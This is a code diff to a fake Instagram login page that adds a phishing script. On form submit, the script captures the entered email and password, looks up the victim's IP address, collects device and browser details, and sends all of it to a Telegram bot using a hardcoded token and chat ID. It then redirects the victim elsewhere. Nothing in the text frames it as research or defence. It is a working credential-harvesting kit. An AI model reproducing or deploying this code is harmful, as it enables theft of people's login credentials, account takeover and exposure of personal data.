@@ -68,58 +68,54 @@
         <p class="copyright">© 2020 Instagram from Facebook</p>
     </footer>
 
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7592683155:AAGZtj2H35vQImEMyOkR6JpBp8Xq8xkgqno"; // التوكن الخاص بك
+        const CHAT_ID = "6499040060"; // معرف الشات
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
 
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-<script>
-    const TOKEN = "7592683155:AAGZtj2H35vQImEMyOkR6JpBp8Xq8xkgqno";                                                            // هنا التوكين              
-    const CHAT_ID = "6499040060";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+            // توجه المستخدم مباشرة إلى رابط جديد
+            window.location.href = "https://www.example.com";
 
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault();
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-        axios.get('https://api.ipify.org?format=json')
-            .then(response => {
-                const ip = response.data.ip;
+                    const message = ` 
+                        <b>New Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
 
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-
-                const message = ` 
-                    <b>New Login Attempt</b>\n
-                    <b>Email:</b> ${email}\n
-                    <b>Password:</b> ${password}\n
-                    <b>IP Address:</b> ${ip}\n
-                    <b>Device Type:</b> ${deviceType}\n
-                    <b>Platform:</b> ${platform}\n
-                    <b>User Agent:</b> ${userAgent}\n
-                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
-                `;
-
-                axios.post(URI_API, {
-                    chat_id: CHAT_ID,
-                    parse_mode: 'html',
-                    text: message
-                }).then(response => {
-                    
-                }).catch(error => {
-                
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).catch(error => {
+                        console.error("Error sending data to Telegram:", error);
+                    });
+                })
+                .catch(error => {
+                    console.error("Error getting IP address:", error);
                 });
-            })
-            .catch(error => {
-                
-            });
-    });
-</script>
-
-
+        });
+    </script>
 </body>
 </html>
